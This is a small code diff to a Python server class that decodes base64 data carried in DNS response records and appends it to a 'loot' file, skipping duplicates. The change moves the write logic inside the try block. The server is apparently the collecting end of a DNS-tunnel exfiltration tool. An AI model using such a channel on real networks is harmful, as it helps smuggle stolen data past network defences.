@@ -26,14 +26,14 @@ class Server:
             dnsrr_strings = repr(packet[DNSRR])
             try:
                 incoming_data = base64.b64decode(dnsrr_strings.split('\'')[1].rstrip('.'))
+                if incoming_data == self.last_packet:
+                    pass
+                else:
+                    with open(self.loot_path + self.file_name, 'a') as dns_out:
+                        dns_out.write(incoming_data)
+                    self.last_packet = incoming_data
             except TypeError:
                 pass
-            if incoming_data == self.last_packet:
-                pass
-            else:
-                with open(self.loot_path + self.file_name, 'a') as dns_out:
-                    dns_out.write(incoming_data)
-                self.last_packet = incoming_data
         return
 
     def serve(self):
